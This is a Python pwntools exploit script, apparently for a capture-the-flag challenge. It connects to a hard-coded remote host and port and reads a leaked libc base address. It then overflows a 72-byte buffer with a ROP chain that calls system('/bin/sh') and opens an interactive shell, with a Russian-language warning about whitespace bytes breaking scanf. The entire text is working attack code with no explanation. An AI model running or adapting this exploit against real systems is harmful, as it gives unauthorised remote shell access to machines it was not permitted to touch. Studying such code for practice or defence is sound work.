#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

HOST, PORT = "109.233.56.90", 11672
OFF = 72

LIBC_PRDI = 0x2679e
LIBC_SH = 0x18a156
SYSTEM_PLT = 0x401050
RET = 0x40101a

WS = set(b"\x09\x0a\x0b\x0c\x0d\x20")

def parse_libc_base(blob):
    for line in blob.split(b"\n"):
        if b"libc" in line and b"-" in line[:20]:
            return int(line.split(b"-")[0], 16)
    raise ValueError("libc base not found")

io = remote(HOST, PORT)
leak = io.recvuntil(b"> ")
base = parse_libc_base(leak)
log.success("libc base = %#x", base)

chain = p64(base + LIBC_PRDI)
chain += p64(base + LIBC_SH)
chain += p64(RET)
chain += p64(SYSTEM_PLT)

payload = b"one" + b"A"*(OFF-3) + chain
bad = WS & set(chain)
if bad:
    log.warning("в цепочке остался пробельный байт: %s — scanf оборвёт", [hex(x) for x in bad])
io.sendline(payload)
io.interactive()
